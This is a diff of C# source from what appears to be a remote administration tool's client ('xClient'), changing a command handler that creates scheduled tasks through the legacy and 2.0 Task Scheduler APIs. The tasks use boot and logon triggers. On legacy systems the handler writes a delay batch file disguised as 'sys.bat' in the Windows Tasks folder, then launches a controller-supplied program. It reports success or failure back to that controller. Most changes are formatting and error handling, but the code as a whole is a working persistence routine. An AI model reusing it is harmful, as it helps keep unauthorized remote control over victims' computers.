@@ -571,9 +571,11 @@ namespace xClient.Core.Commands
                     var cTaskGuid = Marshal.GenerateGuidForType(typeof(LegacyTS.CTask));
                     object taskObj;
                     sched.NewWorkItem(command.TaskName, ref cTaskGuid, ref taskGuid, out taskObj);
-                    var task = (LegacyTS.ITask)taskObj;
+                    var task = (LegacyTS.ITask) taskObj;
 
-                    task.SetApplicationName(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") + "\\sys.bat");
+                    task.SetApplicationName(
+                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") +
+                        "\\sys.bat");
                     task.SetParameters(command.Arguments ?? "");
                     task.SetComment("");
                     task.SetCreator(name.ToString());
@@ -583,8 +585,8 @@ namespace xClient.Core.Commands
                     task.SetAccountInformation("", pwd);
                     Marshal.FreeCoTaskMem(pwd);
                     task.SetIdleWait(10, 20);
-                    task.SetMaxRunTime((uint)new TimeSpan(1, 0, 0).TotalMilliseconds);
-                    task.SetPriority((uint)ProcessPriorityClass.High);
+                    task.SetMaxRunTime((uint) new TimeSpan(1, 0, 0).TotalMilliseconds);
+                    task.SetPriority((uint) ProcessPriorityClass.High);
 
                     ushort triggerIdx;
                     LegacyTS.ITaskTrigger iTrigger;
@@ -594,12 +596,12 @@ namespace xClient.Core.Commands
                     var trigger = new LegacyTS.TaskTrigger();
                     iTrigger.GetTrigger(ref trigger);
                     trigger.Type = LegacyTS.TaskTriggerType.EVENT_TRIGGER_AT_SYSTEMSTART;
-                    trigger.TriggerSize = (ushort)Marshal.SizeOf(trigger);
-                    trigger.BeginYear = (ushort)DateTime.Today.Year;
-                    trigger.BeginMonth = (ushort)DateTime.Today.Month;
-                    trigger.BeginDay = (ushort)DateTime.Today.Day;
+                    trigger.TriggerSize = (ushort) Marshal.SizeOf(trigger);
+                    trigger.BeginYear = (ushort) DateTime.Today.Year;
+                    trigger.BeginMonth = (ushort) DateTime.Today.Month;
+                    trigger.BeginDay = (ushort) DateTime.Today.Day;
                     // Remove "Disabled" flag
-                    trigger.Flags &= ~(uint)0x4 /* TASK_TRIGGER_FLAG.DISABLED */;
+                    trigger.Flags &= ~(uint) 0x4 /* TASK_TRIGGER_FLAG.DISABLED */;
 
                     iTrigger.SetTrigger(ref trigger);
                     task.CreateTrigger(out triggerIdx, out iTrigger);
@@ -608,25 +610,26 @@ namespace xClient.Core.Commands
                     trigger = new LegacyTS.TaskTrigger();
                     iTrigger.GetTrigger(ref trigger);
                     trigger.Type = LegacyTS.TaskTriggerType.EVENT_TRIGGER_AT_LOGON;
-                    trigger.TriggerSize = (ushort)Marshal.SizeOf(trigger);
-                    trigger.BeginYear = (ushort)DateTime.Today.Year;
-                    trigger.BeginMonth = (ushort)DateTime.Today.Month;
-                    trigger.BeginDay = (ushort)DateTime.Today.Day;
+                    trigger.TriggerSize = (ushort) Marshal.SizeOf(trigger);
+                    trigger.BeginYear = (ushort) DateTime.Today.Year;
+                    trigger.BeginMonth = (ushort) DateTime.Today.Month;
+                    trigger.BeginDay = (ushort) DateTime.Today.Day;
                     // Remove "Disabled" flag
-                    trigger.Flags &= ~(uint)0x4 /* TASK_TRIGGER_FLAG.DISABLED */;
+                    trigger.Flags &= ~(uint) 0x4 /* TASK_TRIGGER_FLAG.DISABLED */;
 
                     iTrigger.SetTrigger(ref trigger);
 
-                    var iFile = (IPersistFile)task;
+                    var iFile = (IPersistFile) task;
                     iFile.Save(null, false);
 
                     // Create a small batch file to delay
                     File.WriteAllText(
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") + "\\sys.bat",
+                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") +
+                        "\\sys.bat",
                         string.Format("ping 127.0.0.1 -n 180 > nul{0}start\"{1}\"", Environment.NewLine, command.Path));
                 }
                 // Else we use Task Scheduler 2.0
-                else if(PlatformHelper.VistaOrHigher)
+                else if (PlatformHelper.VistaOrHigher)
                 {
                     var sched = new TaskScheduler();
                     sched.Connect();
@@ -651,8 +654,8 @@ namespace xClient.Core.Commands
                     task.Principal.UserId = name.ToString();
 
                     task.Triggers.Create(TaskTriggerType.Logon);
-                    var bootTrigger = (IBootTrigger)task.Triggers.Create(TaskTriggerType.Boot);
-                    var execAction = (IExecAction)task.Actions.Create(TaskActionType.Execute);
+                    var bootTrigger = (IBootTrigger) task.Triggers.Create(TaskTriggerType.Boot);
+                    var execAction = (IExecAction) task.Actions.Create(TaskActionType.Execute);
 
                     bootTrigger.Id = "AnyLogon";
                     bootTrigger.Delay = "PT1M";
@@ -660,16 +663,23 @@ namespace xClient.Core.Commands
                     bootTrigger.Repetition.Duration = "PT13M";
                     bootTrigger.Repetition.StopAtDurationEnd = true;
 
-                    execAction.Path = command.Path;
+                    execAction.Path = command.Path ?? "";
                     execAction.Arguments = command.Arguments;
 
                     folder.RegisterTaskDefinition(command.TaskName, task, 6 /* TASK_CREATE_OR_UPDATE */, null, null,
                         TaskLogonType.InteractiveTokenOrPassword);
                 }
             }
+            catch (COMException e)
+            {
+                new Packets.ClientPackets.SetStatus(string.Format("Failed to create task with code: {0}.", e.ErrorCode))
+                    .Execute(client);
+                return;
+            }
             catch
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Failed to create task with code: {0}.", Marshal.GetLastWin32Error())).Execute(client);
+                new Packets.ClientPackets.SetStatus("Failed to create task.").Execute(client);
+                return;
             }
             new Packets.ClientPackets.SetStatus("Created task.").Execute(client);
         }
